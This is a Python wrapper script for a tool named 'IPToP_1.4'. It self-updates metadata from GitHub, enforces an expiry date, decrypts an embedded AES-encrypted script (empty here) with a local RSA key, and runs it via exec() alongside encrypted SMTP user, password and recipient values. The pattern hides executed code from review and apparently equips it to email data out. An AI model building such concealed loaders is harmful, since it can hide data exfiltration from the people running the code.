#!/usr/bin/env python3
import os
import json
import base64
import hashlib
import requests
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from datetime import datetime
import sys
from packaging import version
import logging

# Configuration
SCRIPT_BASE_NAME = "IPToP_1.4"
BASE_RAW_URL = "https://raw.githubusercontent.com/DjahNoDead/IPToP/main/"
METADATA_URL = BASE_RAW_URL + SCRIPT_BASE_NAME + "_encrypted.metadata.json"
LOG_LEVEL = logging.INFO

# Setup logging
logging.basicConfig(level=LOG_LEVEL, format='%(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

def decrypt_data(encrypted_data, key):
    """Déchiffre les données avec la clé fournie"""
    try:
        encrypted_data = base64.b64decode(encrypted_data)
        iv, ct = encrypted_data[:16], encrypted_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ct), AES.block_size).decode()
    except Exception as e:
        logger.error(f"Erreur de déchiffrement: {e}")
        return None

def decrypt_key_with_rsa(encrypted_key, private_key):
    """Déchiffre la clé AES avec la clé privée RSA"""
    try:
        return PKCS1_OAEP.new(private_key).decrypt(base64.b64decode(encrypted_key))
    except Exception as e:
        logger.error(f"Erreur de déchiffrement RSA: {e}")
        return None

def check_for_updates():
    """Vérifie les mises à jour disponibles"""
    try:
        logger.info("Vérification des mises à jour...")
        try:
            with open(f"{SCRIPT_BASE_NAME}_encrypted.metadata.json") as f:
                local_meta = json.load(f)
            local_version = local_meta["version"]
        except Exception as e:
            logger.warning(f"Impossible de lire la version locale: {e}")
            return False

        try:
            response = requests.get(METADATA_URL, timeout=10)
            if response.status_code == 200:
                remote_meta = response.json()
                remote_version = remote_meta["version"]
                
                if version.parse(remote_version) > version.parse(local_version):
                    logger.info(f"Nouvelle version disponible: {local_version} → {remote_version}")
                    return True
                elif version.parse(remote_version) == version.parse(local_version):
                    logger.info("Vous avez déjà la dernière version")
                else:
                    logger.warning(f"Version locale ({local_version}) plus récente que le dépôt ({remote_version})")
            else:
                logger.warning(f"Impossible de vérifier (HTTP {response.status_code})")
        except Exception as e:
            logger.warning(f"Erreur lors de la vérification: {str(e)}")
    except Exception as e:
        logger.error(f"Erreur critique: {str(e)}")
    return False

def perform_update():
    """Effectue la mise à jour du script"""
    try:
        logger.info("Tentative de mise à jour...")
        response = requests.get(METADATA_URL, timeout=15)
        if response.status_code == 200:
            remote_meta = response.json()
            with open(f"{SCRIPT_BASE_NAME}_encrypted.metadata.json", 'w') as f:
                json.dump(remote_meta, f)
            logger.info("Mise à jour réussie")
            return True
        else:
            logger.error(f"Échec (HTTP {response.status_code})")
    except Exception as e:
        logger.error(f"Erreur de mise à jour: {str(e)}")
    return False

def main():
    """Point d'entrée principal du wrapper"""
    try:
        # Vérification des mises à jour
        if check_for_updates():
            if perform_update():
                logger.info("Redémarrez le script pour utiliser la nouvelle version")
                return

        # Chargement des métadonnées
        with open(f"{SCRIPT_BASE_NAME}_encrypted.metadata.json") as f:
            metadata = json.load(f)
        
        # Vérification de la date d'expiration
        if datetime.now() > datetime.strptime(metadata["expiration_date"], "%Y-%m-%d"):
            logger.error("Script expiré")
            return
        
        # Chargement de la clé privée
        if not os.path.exists("private_key.pem"):
            logger.error("Fichier private_key.pem introuvable")
            return
            
        with open("private_key.pem", "rb") as f:
            private_key = RSA.import_key(f.read())
        
        # Déchiffrement de la clé AES
        aes_key = decrypt_key_with_rsa(metadata["encrypted_key"], private_key)
        if not aes_key:
            logger.error("Échec du déchiffrement de la clé AES")
            return
        
        # Déchiffrement du script principal
        decrypted_script = decrypt_data(
            """""",
            aes_key
        )
        
        if not decrypted_script:
            logger.error("Échec du déchiffrement du script principal")
            return

        # Préparation de l'environnement d'exécution
        exec_globals = {
            '__builtins__': globals()['__builtins__'],
            'AES': AES,
            'unpad': unpad,
            'base64': base64,
            'key': aes_key,
            'encrypted_smtp_user': """tAzytm2zn9vK2XyPXUcJjKgtAJUcdQJXr9vPgLUehRBbGeTCvOIZUkJMY6Gob8jf""",
            'encrypted_smtp_password': """NE+Y541mVv7saQzwNMqIlehScKQTZXoc+UXJFPjJKhdrcDDtYs+5nThoxmsJFJBQ""",
            'encrypted_recipient': """2UIjzWeKLjy15aitGICAXPrvoW5CJKQbYSru0fq3CZwukxYBzaPbr1QAW8H2XQYQ""",
            'decrypt_data': lambda data: decrypt_data(data, aes_key),
            'logger': logger
        }

        # Exécution du script déchiffré
        logger.info("Exécution du script déchiffré...")
        exec(decrypted_script, exec_globals)
        
    except Exception as e:
        logger.critical(f"Erreur fatale: {str(e)}", exc_info=True)
        sys.exit(1)

if __name__ == "__main__":
    main()
